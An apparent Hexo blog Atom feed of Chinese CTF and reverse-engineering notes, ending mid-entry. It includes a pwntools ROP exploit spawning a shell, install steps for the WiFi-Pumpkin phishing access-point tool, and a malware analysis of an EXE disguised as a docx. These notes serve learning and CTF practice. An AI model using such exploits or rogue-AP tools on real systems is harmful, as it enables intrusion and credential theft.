<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ESE&#39;s Note</title>
  
  <subtitle>阅览室</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-11-09T11:38:13.078Z</updated>
  <id>http://yoursite.com/</id>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>hexo安装配置</title>
    <link href="http://yoursite.com/2017/11/09/misc_hexo/"/>
    <id>http://yoursite.com/2017/11/09/misc_hexo/</id>
    <published>2017-11-09T11:31:23.091Z</published>
    <updated>2017-11-09T11:38:13.078Z</updated>
    
    <content type="html"><![CDATA[<p>颜值即正义<br><a id="more"></a></p><h2 id="1、安装"><a href="#1、安装" class="headerlink" title="1、安装"></a>1、安装</h2><p><a href="http://blog.betamao.me/2017/08/24/COS%E5%8A%A0CDN%E9%83%A8%E7%BD%B2HEXO/#more" target="_blank" rel="external">http://blog.betamao.me/2017/08/24/COS%E5%8A%A0CDN%E9%83%A8%E7%BD%B2HEXO/#more</a></p><h2 id="2、换主题"><a href="#2、换主题" class="headerlink" title="2、换主题"></a>2、换主题</h2><p><a href="http://blog.csdn.net/qq_33699981/article/details/72716951" target="_blank" rel="external">http://blog.csdn.net/qq_33699981/article/details/72716951</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;颜值即正义&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>WIFI破解密码</title>
    <link href="http://yoursite.com/2017/11/09/misc_wifi/"/>
    <id>http://yoursite.com/2017/11/09/misc_wifi/</id>
    <published>2017-11-09T06:32:11.621Z</published>
    <updated>2017-11-09T11:39:50.144Z</updated>
    
    <content type="html"><![CDATA[<p>到处都是wifi，那就破解吧，贼好用<br><a id="more"></a></p><h2 id="1、WIFI破解密码"><a href="#1、WIFI破解密码" class="headerlink" title="1、WIFI破解密码"></a>1、WIFI破解密码</h2><h2 id="2、钓鱼WiFi"><a href="#2、钓鱼WiFi" class="headerlink" title="2、钓鱼WiFi"></a>2、钓鱼WiFi</h2><p>需要安装 Pyqt4<br>安装类库<br><code>pip install -r requirements.txt</code><br>安装:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/P0cL4bs/WiFi-Pumpkin.git</div><div class="line">cd WiFi-Pumpkin</div><div class="line">chmod +x installer.sh</div><div class="line">./installer.sh --install</div></pre></td></tr></table></figure></p><p>安装成功<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1flbtpq4f9bj30r50h8dho.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;到处都是wifi，那就破解吧，贼好用&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>RE——反调试</title>
    <link href="http://yoursite.com/2017/11/08/re_kx3/"/>
    <id>http://yoursite.com/2017/11/08/re_kx3/</id>
    <published>2017-11-08T09:21:27.043Z</published>
    <updated>2017-11-09T12:00:02.807Z</updated>
    
    <content type="html"><![CDATA[<p>去膜拜看雪师傅啦<br><a id="more"></a></p><h2 id="1、题目"><a href="#1、题目" class="headerlink" title="1、题目"></a>1、题目</h2><p>链接：<a href="http://pan.baidu.com/s/1kUYItoz" target="_blank" rel="external">http://pan.baidu.com/s/1kUYItoz</a> 密码：xem0<br>学习为主。看大神们的记录，学习一遍</p><h2 id="3、分析"><a href="#3、分析" class="headerlink" title="3、分析"></a>3、分析</h2><p>一、侦查：无壳 Microsoft Visual C/C++(6.0)[libc]，诸多反调试<br>二、OD附加，过反调试<br>先运行exe程序，再打开od附加exe进程，再调用GetWindowTextW的API时候下断点，点击运行，exe程序输入sn,此时会断在od中的GetWindowTextW的断点（还在api系统区）<br><img src="" alt=""><br>往下走来到程序区<br><img src="" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;去膜拜看雪师傅啦&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>中华人民共和国网络安全法</title>
    <link href="http://yoursite.com/2017/11/07/misc_fa/"/>
    <id>http://yoursite.com/2017/11/07/misc_fa/</id>
    <published>2017-11-07T07:58:07.243Z</published>
    <updated>2017-11-09T11:37:38.202Z</updated>
    
    <content type="html"><![CDATA[<p>必学中华人民共和国网络安全法<br><a id="more"></a></p><h2 id="1、链接"><a href="#1、链接" class="headerlink" title="1、链接"></a>1、链接</h2><p><a href="https://www.virzz.com/2017/06/01/Network_security_law_of_the_PRC.html" target="_blank" rel="external">https://www.virzz.com/2017/06/01/Network_security_law_of_the_PRC.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;必学中华人民共和国网络安全法&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>RE--某秋的比赛</title>
    <link href="http://yoursite.com/2017/11/05/re_suanfa/"/>
    <id>http://yoursite.com/2017/11/05/re_suanfa/</id>
    <published>2017-11-05T03:07:19.715Z</published>
    <updated>2017-11-09T11:55:35.829Z</updated>
    
    <content type="html"><![CDATA[<p>完全被打蒙<br><a id="more"></a><br>昨天ctf，怀疑自己到疯，代码不会写，这里记录一下，以后方便用到</p><h2 id="1、花指令"><a href="#1、花指令" class="headerlink" title="1、花指令"></a>1、花指令</h2><p>6789abcd –&gt; 3637383961626364 -&gt;6789abcd<br><a href="https://www.bejson.com/convert/ox2str/" target="_blank" rel="external">https://www.bejson.com/convert/ox2str/</a></p><p>b=’66778899’  –&gt; [0x66,0x77,0x88,0x99]<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">def fen(b):</div><div class="line">    k = len(b)</div><div class="line">    n=[]</div><div class="line">    for i in range(len(b)-6):</div><div class="line">        if i%6==0:</div><div class="line">            n.append(b[i]+b[i+1])</div><div class="line">            n.append(b[i+2]+b[i+3])</div><div class="line">            n.append(b[i+4]+b[i+5])</div><div class="line">            i = i + 6</div><div class="line">    n.append(b[k - 6] + b[k - 5])</div><div class="line">    n.append(b[k - 4] + b[k - 3])</div><div class="line">    n.append(b[k - 2] + b[k - 1])</div><div class="line"></div><div class="line">    k = []</div><div class="line">    for i in range(len(n)):</div><div class="line">        k.append(hex(int(n[i], 16)))</div><div class="line">    return k</div></pre></td></tr></table></figure></p><p>最后附上，自己的juckcode.代码<br>思路<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">flag + base64</div><div class="line">k=flag+0x40 +base64</div><div class="line">flag=(k*7)%256</div><div class="line">flag=(flag+0x40) *7)%256</div><div class="line">算法1</div><div class="line">ZpYA           mqmA             9+LC</div><div class="line">大写-0x41</div><div class="line">小写-0x47</div><div class="line">数字+0x4</div><div class="line">+   0x13            </div><div class="line">7a z 61 a 33-1a</div><div class="line">5a Z 40 A 19-00</div><div class="line">shuz  0-9 34-3d</div><div class="line">3e        3e-13     </div><div class="line">算法2</div><div class="line">第一位 </div><div class="line">第二位</div><div class="line">第三位</div><div class="line">a1=0x2c</div><div class="line">a2=0x30</div><div class="line">a3=0x2c</div><div class="line">a4=0</div><div class="line">a1=0x19</div><div class="line">a2=0x29</div><div class="line">a3=0x18</div><div class="line">a4=0</div><div class="line">k=a1*4+(a2&amp;0x30)/16</div><div class="line">print k</div><div class="line">k=(a3&amp;0x3c)/4+(a2&amp;0x0f)*16</div><div class="line">print k</div><div class="line">k=((a3&amp;0x03)*2**6)%256+a4</div><div class="line">print k</div></pre></td></tr></table></figure></p><p>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div></pre></td><td class="code"><pre><div class="line">#coding:utf-8</div><div class="line">import base64</div><div class="line">#分解flag_enc</div><div class="line">c1=[]</div><div class="line"># def fen():</div><div class="line">#     a = &apos;FFIF@@IqqIH@sGBBsBHFAHH@FFIuB@tvrrHHrFuBD@qqqHH@GFtuB@EIqrHHCDuBsBqurHH@EuGuB@trqrHHCDuBsBruvHH@FFIF@@AHqrHHEEFBsBGtvHH@FBHuB@trqrHHADFBD@rquHH@FurF@@IqqrHHvGuBD@tCDHH@EuGuB@tvrrHHCDuBD@tCDHH@FuruB@tvrIH@@DBBsBGtvHH@GquuB@EIqrHHvGuBsBtGEHH@EuGuB@tvrIH@BDqBsBIFEHH@GFtF@@IqqrHHEEFBD@srBHH@GBsuB@trqrHHIFFBD@rquHH@FFIuB@tvrrHHtCDB@@&apos;</div><div class="line">#     for i in a:</div><div class="line">#         c.append(chr(ord(i) - 16))</div><div class="line">#     b = &quot;&quot;.join(c)</div><div class="line">#     k = len(b)</div><div class="line">#     print b</div><div class="line">#     for i in range(len(b)-6):</div><div class="line">#         if i%6==0:</div><div class="line">#             n.append(b[i]+b[i+1])</div><div class="line">#             n.append(b[i+2]+b[i+3])</div><div class="line">#             n.append(b[i+4]+b[i+5])</div><div class="line">#             i = i + 6</div><div class="line">#     n.append(b[k - 6] + b[k - 5])</div><div class="line">#     n.append(b[k - 4] + b[k - 3])</div><div class="line">#     n.append(b[k - 2] + b[k - 1])</div><div class="line">#</div><div class="line">#     print n</div><div class="line">#匹配字符</div><div class="line">def bp():</div><div class="line">    # n=[&apos;66&apos;, &apos;96&apos;, &apos;00&apos;, &apos;9a&apos;, &apos;a9&apos;, &apos;80&apos;, &apos;c7&apos;, &apos;22&apos;, &apos;c2&apos;, &apos;86&apos;, &apos;18&apos;, &apos;80&apos;, &apos;66&apos;, &apos;9e&apos;, &apos;20&apos;, &apos;df&apos;, &apos;bb&apos;, &apos;88&apos;, &apos;b6&apos;, &apos;e2&apos;, &apos;40&apos;, &apos;aa&apos;, &apos;a8&apos;, &apos;80&apos;, &apos;76&apos;, &apos;de&apos;, &apos;20&apos;, &apos;59&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;34&apos;, &apos;e2&apos;, &apos;c2&apos;, &apos;ae&apos;, &apos;b8&apos;, &apos;80&apos;, &apos;5e&apos;, &apos;7e&apos;, &apos;20&apos;, &apos;db&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;34&apos;, &apos;e2&apos;, &apos;c2&apos;, &apos;be&apos;, &apos;f8&apos;, &apos;80&apos;, &apos;66&apos;, &apos;96&apos;, &apos;00&apos;, &apos;18&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;55&apos;, &apos;62&apos;, &apos;c2&apos;, &apos;7d&apos;, &apos;f8&apos;, &apos;80&apos;, &apos;62&apos;, &apos;8e&apos;, &apos;20&apos;, &apos;db&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;14&apos;, &apos;62&apos;, &apos;40&apos;, &apos;ba&apos;, &apos;e8&apos;, &apos;80&apos;, &apos;6e&apos;, &apos;b6&apos;, &apos;00&apos;, &apos;9a&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;f7&apos;, &apos;e2&apos;, &apos;40&apos;, &apos;d3&apos;, &apos;48&apos;, &apos;80&apos;, &apos;5e&apos;, &apos;7e&apos;, &apos;20&apos;, &apos;df&apos;, &apos;bb&apos;, &apos;88&apos;, &apos;34&apos;, &apos;e2&apos;, &apos;40&apos;, &apos;d3&apos;, &apos;48&apos;, &apos;80&apos;, &apos;6e&apos;, &apos;be&apos;, &apos;20&apos;, &apos;df&apos;, &apos;b9&apos;, &apos;80&apos;, &apos;04&apos;, &apos;22&apos;, &apos;c2&apos;, &apos;7d&apos;, &apos;f8&apos;, &apos;80&apos;, &apos;7a&apos;, &apos;ee&apos;, &apos;20&apos;, &apos;59&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;f7&apos;, &apos;e2&apos;, &apos;c2&apos;, &apos;d7&apos;, &apos;58&apos;, &apos;80&apos;, &apos;5e&apos;, &apos;7e&apos;, &apos;20&apos;, &apos;df&apos;, &apos;b9&apos;, &apos;80&apos;, &apos;24&apos;, &apos;a2&apos;, &apos;c2&apos;, &apos;96&apos;, &apos;58&apos;, &apos;80&apos;, &apos;76&apos;, &apos;d6&apos;, &apos;00&apos;, &apos;9a&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;55&apos;, &apos;62&apos;, &apos;40&apos;, &apos;cb&apos;, &apos;28&apos;, &apos;80&apos;, &apos;72&apos;, &apos;ce&apos;, &apos;20&apos;, &apos;db&apos;, &apos;ab&apos;, &apos;88&apos;, &apos;96&apos;, &apos;62&apos;, &apos;40&apos;, &apos;ba&apos;, &apos;e8&apos;, &apos;80&apos;, &apos;66&apos;, &apos;9e&apos;, &apos;20&apos;, &apos;df&apos;, &apos;bb&apos;, &apos;88&apos;, &apos;d3&apos;, &apos;42&apos;, &apos;00&apos;]</div><div class="line">    # k=len(n)</div><div class="line">    # print k</div><div class="line">    # for i in range(len(n)-3):</div><div class="line">    #     if i % 3 == 0:</div><div class="line">    #         k1=int(n[i], 16)</div><div class="line">    #         k2=int(n[i+1], 16)</div><div class="line">    #         k3=int(n[i+2], 16)</div><div class="line">    #         print i,hex(k1),hex(k2),hex(k3)</div><div class="line">    #         bp1(k1, k2, k3)</div><div class="line">    #</div><div class="line">    # k1 = int(int(n[k-3], 16))</div><div class="line">    # k2 = int(int(n[k-2], 16))</div><div class="line">    # k3 = int(int(n[k-1], 16))</div><div class="line">    # bp1(k1, k2, k3)</div><div class="line"></div><div class="line">    q=[]</div><div class="line">    c1=[90, 109, 120, 104, 90, 51, 116, 113, 100, 87, 78, 114, 88, 50, 78, 118, 90, 71, 86, 102, 89, 50, 70, 117, 98, 109, 48, 88, 51, 78, 48, 98, 51, 66, 102, 101, 87, 49, 88, 51, 74, 108, 100, 109, 86, 121, 99, 50, 108, 117, 90, 51, 48]</div><div class="line">    print c1</div><div class="line">    for i in range(len(c1)):</div><div class="line">        q.append(chr(c1[i]))</div><div class="line">    print &quot;&quot;.join(q)</div><div class="line"></div><div class="line">def bp1(k1,k2,k3):</div><div class="line">    begin = 0x2f - 0x41</div><div class="line">    end = 0x7a - 0x41</div><div class="line">    ll = 0</div><div class="line">    for a1 in range(begin, end):</div><div class="line">        if ll == 1:</div><div class="line">            break;</div><div class="line">        for a2 in range(begin, end):</div><div class="line">            if ll == 1:</div><div class="line">                break;</div><div class="line">            for a3 in range(begin, end):</div><div class="line">                if ll == 1:</div><div class="line">                    break;</div><div class="line">                for a4 in range(begin, end):</div><div class="line">                    if (a1 * 4 + (a2 &amp; 0x30) / 16 == k1) and ((a3 &amp; 0x3c) / 4 + (a2 &amp; 0x0f) * 16 == k2) and (</div><div class="line">                                        ((a3 &amp; 0x03) * 2 ** 6) % 256 + a4 == k3):</div><div class="line">                        ll = 1</div><div class="line">                        k = int(hex(a1), 16)</div><div class="line">                        k=pandun(k)</div><div class="line">                        print chr(k)</div><div class="line">                        c1.append(chr(k))</div><div class="line">                        break;</div><div class="line">def pandun(x1):</div><div class="line">    if (x1&gt;=0)and(x1&lt;=0x19):</div><div class="line">        x1=int(x1)+0x41</div><div class="line">    elif (x1&gt;=0x1a)and(x1&lt;=0x33):</div><div class="line">        x1 = int(x1) + 0x47</div><div class="line">    elif (x1&gt;=0x34)and(x1&lt;=0x3d):</div><div class="line">        x1=int(x1)-0x4</div><div class="line">    else:</div><div class="line">        x1=int(x1)-0x13</div><div class="line">    return x1</div><div class="line">def test():</div><div class="line">    a1 = 0x2c</div><div class="line">    a2 = 0x30</div><div class="line">    a3 = 0x2c</div><div class="line">    a4 = 0</div><div class="line">    k = a1 * 4 + (a2 &amp; 0x30) / 16</div><div class="line">    print hex(k)</div><div class="line">    k = (a3 &amp; 0x3c) / 4 + (a2 &amp; 0x0f) * 16</div><div class="line">    print hex(k)</div><div class="line">    k = ((a3 &amp; 0x03) * 2 ** 6) % 256 + a4</div><div class="line">    print hex(k)</div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    bp()</div></pre></td></tr></table></figure></p><p>这里我是od一步一步分析的，还是耐心不够<br>后来看师傅们的，发现都用爆破，这。。。。。(怪我代码能力弱了)<br>还有一个可以看反编译？这很奇怪（原来是有花指令，导致ida不能反编译成伪代码)<br>后来下来自己下来od手动去除伪代码（没有用的单字节去掉，不过伪代码有些东西类型，这只是一种）,可以f5后，也是要看大量的代码，佩服师傅们的能力，自己觉得od和ida结合是最好的<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1flahd5iz10j30hf0iuglv.jpg" alt=""><br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1flahdhlfxkj30iq0inwem.jpg" alt=""><br>这里也附上师傅们的wp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">import string</div><div class="line">import base64</div><div class="line">data = file(&apos;flag.enc&apos;).read().strip()</div><div class="line">data1 = &apos;&apos;</div><div class="line">for i in data:</div><div class="line">data1 += chr(ord(i)-0x10)</div><div class="line">data1 = data1.decode(&apos;hex&apos;)</div><div class="line">bd = base64.b64encode(data1)</div><div class="line">t1 = string.uppercase+string.lowercase+string.digits+r&apos;+/&apos;</div><div class="line">t2=&apos;&apos;</div><div class="line">for i in t1:</div><div class="line">t2 += chr(ord(i)-10)</div><div class="line">table1 = string.maketrans(t1,t2)</div><div class="line">table2 = string.maketrans(t2,t1)</div><div class="line">bd1 = bd.translate(table1)</div><div class="line">s=&apos;&apos;</div><div class="line">for i in range(len(bd1)/4):</div><div class="line">s += bd1[4*i]</div><div class="line">bd2 = s.translate(table2)</div><div class="line">n = 3-len(bd2)%3</div><div class="line">bd2 += &apos;=&apos;*n</div><div class="line">print base64.b64decode(bd2)</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;完全被打蒙&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PWN为了入群做题</title>
    <link href="http://yoursite.com/2017/11/03/pwn_ruqun/"/>
    <id>http://yoursite.com/2017/11/03/pwn_ruqun/</id>
    <published>2017-11-03T07:11:56.346Z</published>
    <updated>2017-11-09T11:41:20.593Z</updated>
    
    <content type="html"><![CDATA[<p>想学习，必要了解各位师傅，必入群<br><a id="more"></a></p><h2 id="1、入群"><a href="#1、入群" class="headerlink" title="1、入群"></a>1、入群</h2><p>链接：<a href="http://pan.baidu.com/s/1qY4wyoW" target="_blank" rel="external">http://pan.baidu.com/s/1qY4wyoW</a> 密码：46d4<br>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">elf=ELF(&apos;pwn&apos;)</div><div class="line">get_got = elf.got[&apos;fgets&apos;]</div><div class="line">puts_plt = elf.plt[&apos;puts&apos;]</div><div class="line">puts_got = elf.got[&apos;puts&apos;]</div><div class="line">main = elf.symbols[&apos;main&apos;]</div><div class="line"></div><div class="line">bss = 0x6020b0</div><div class="line">ppprdi=0x401ab0</div><div class="line">        </div><div class="line">p = process(&apos;pwn&apos;)</div><div class="line">p.recvuntil(&apos;&gt; &apos;)</div><div class="line">#gdb.attach(p,&apos;&apos;&apos;b *0x4019ea &apos;&apos;&apos;)</div><div class="line"></div><div class="line">def peek(addr):</div><div class="line">    rop = p64(ppprdi) +p64(addr) +p64(1)+p64(1) + p64(puts_plt) + p64(main)</div><div class="line">    p.sendline(&apos;A&apos;*40+ rop)</div><div class="line">    str = p.recvuntil(&apos;&gt; &apos;)</div><div class="line">    result = str.split(&apos;\ncallme&apos;)[0]</div><div class="line">    if result == &apos;&apos;:</div><div class="line">        return &apos;\x00&apos;</div><div class="line">    return result</div><div class="line"></div><div class="line">d = DynELF(peek, elf=elf)</div><div class="line">system = int(d.lookup(&apos;system&apos;, &apos;libc&apos;))</div><div class="line">gets = int(d.lookup(&apos;gets&apos;, &apos;libc&apos;))</div><div class="line"></div><div class="line"></div><div class="line">rop = p64(ppprdi) + p64(bss) +p64(1)+p64(1) + p64(gets) + p64(main)</div><div class="line">payload = &quot;A&quot;*40 + rop</div><div class="line">p.sendline(payload)</div><div class="line">p.sendline(&apos;/bin/sh\0&apos;)</div><div class="line">p.recvuntil(&apos;&gt; &apos;)</div><div class="line"></div><div class="line">rop=p64(ppprdi) + p64(bss) +p64(1)+p64(1) + p64(system) + p64(0xdeadbeef)</div><div class="line">payload = &quot;A&quot;*40+ rop</div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><p>之后是什么、、、、说好的flag呢？<br>哇还有东西，居然还有都行，居然是.dat文件</p><p>害怕-恐怖</p><p>才想到做题技术大牛说的，不要害怕新的挑战，敢于尝试，</p><p>然后，研究几分钟，发现就很简单算法</p><h2 id="这时想去昨天技术大牛说的话，可能并不难，只是有颗害怕的心"><a href="#这时想去昨天技术大牛说的话，可能并不难，只是有颗害怕的心" class="headerlink" title="这时想去昨天技术大牛说的话，可能并不难，只是有颗害怕的心"></a>这时想去昨天技术大牛说的话，可能并不难，只是有颗害怕的心</h2><p>Do_more_and_ask_less</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;想学习，必要了解各位师傅，必入群&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>RE_病毒分析</title>
    <link href="http://yoursite.com/2017/11/01/re_doxc_exe/"/>
    <id>http://yoursite.com/2017/11/01/re_doxc_exe/</id>
    <published>2017-11-01T11:13:34.063Z</published>
    <updated>2017-11-09T11:52:23.643Z</updated>
    
    <content type="html"><![CDATA[<p>EXE文件伪装成docx，初次见到蒙<br><a id="more"></a></p><h2 id="1、题目"><a href="#1、题目" class="headerlink" title="1、题目"></a>1、题目</h2><p>链接：<a href="http://pan.baidu.com/s/1qX8PHnA" target="_blank" rel="external">http://pan.baidu.com/s/1qX8PHnA</a> 密码：34yi</p><h2 id="2、查看文件"><a href="#2、查看文件" class="headerlink" title="2、查看文件"></a>2、查看文件</h2><p>ida打开exe<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fl2t3vhhjkj30mp0azaam.jpg" alt=""><br>发现加壳程序,pedi没有检查倒是什么壳，放到kali用strings一下<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fl2t8nqbo8j30ed04g3yn.jpg" alt=""><br>尝试upx脱壳机脱，然而脱不下来,手动脱了,UPX的脱壳比较简单，找到pushad 和popad下断点，然后往下跟就好，找到的OEP<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fl2td2kzkpj31020ejq3s.jpg" alt=""><br>OEP开始一般都这样的<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fl2t5f8sq7j30x30d2gos.jpg" alt=""><br>右键使用OllyDump将程序dump出来即可，UPX加壳的程序不需要修复IAT就可以直接运行<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1fl2tppwexjj30ye0gkta3.jpg" alt=""><br>用ida打开,已经可以看见代码啦<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1fl2twn4r0jj30ym0fqgn1.jpg" alt=""><br>sub_401370函数的逻辑如下，主要行为为拷贝evil.exe到%temp%下一份，在从资源中释放evil.docx文件到当前目录</p><p>sub_401620的功能很简单，就是如果命令行参数个数为2（即之前新创建的进程），则循环删除evil.exe文件<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fl2u19e10nj30an08pa9x.jpg" alt=""><br>创建一个进程evil.exe “evil.exe”，然后打开docx<br>sub_4018F0从<a href="http://www.ddctf.com/x.jpg中读取数据。x.jpg即题目中的x.jpg，自建服务器然后将x.jpg放在" target="_blank" rel="external">http://www.ddctf.com/x.jpg中读取数据。x.jpg即题目中的x.jpg，自建服务器然后将x.jpg放在</a><br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fl2u4b81agj30mx0e9jrh.jpg" alt=""><br>之后是两个解码函数，这里可以直接忽略其中的逻辑。<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1fl2u5spu00j30lc08st8o.jpg" alt=""><br>然后是执行sub_401220的函数,OD动态跟一下看<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fl2umxfvz1j30gc0a13yf.jpg" alt=""></p><h2 id="3、搭建环境"><a href="#3、搭建环境" class="headerlink" title="3、搭建环境"></a>3、搭建环境</h2><p>我们用IIS在本地搭建web服务，使得程序能访问 <a href="http://www.ddctf.com/x.jpg。" target="_blank" rel="external">http://www.ddctf.com/x.jpg。</a></p><h2 id="3、OD动态"><a href="#3、OD动态" class="headerlink" title="3、OD动态"></a>3、OD动态</h2><p>0x402476（main）<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1fl2wae1m51j30oz0izn1i.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;EXE文件伪装成docx，初次见到蒙&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>RE——看雪</title>
    <link href="http://yoursite.com/2017/10/31/re_kx2/"/>
    <id>http://yoursite.com/2017/10/31/re_kx2/</id>
    <published>2017-10-31T03:00:27.411Z</published>
    <updated>2017-11-09T11:54:17.912Z</updated>
    
    <content type="html"><![CDATA[<p>去膜拜看雪师傅啦<br><a id="more"></a></p><h2 id="1、题目"><a href="#1、题目" class="headerlink" title="1、题目"></a>1、题目</h2><p>链接：<a href="http://pan.baidu.com/s/1kUYItoz" target="_blank" rel="external">http://pan.baidu.com/s/1kUYItoz</a> 密码：xem0<br>第三题，我感觉世界观坍塌啦。依然不会，还是学习为主。看大神们的记录，学习一遍</p><h2 id="3、分析"><a href="#3、分析" class="headerlink" title="3、分析"></a>3、分析</h2><p>一、侦查：无壳 Microsoft Visual C/C++(6.0)[libc]，诸多反调试<br>二、入坑：<br>OD加载（好像我的od直接过了反调试），f9，运行，什么鬼，直接跳到了dll,继续f9….终于出现对话框，输入<br>12345678，结果程序崩溃。</p><p>IDA打开，定位到CrackMe字符串，找到关键函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div 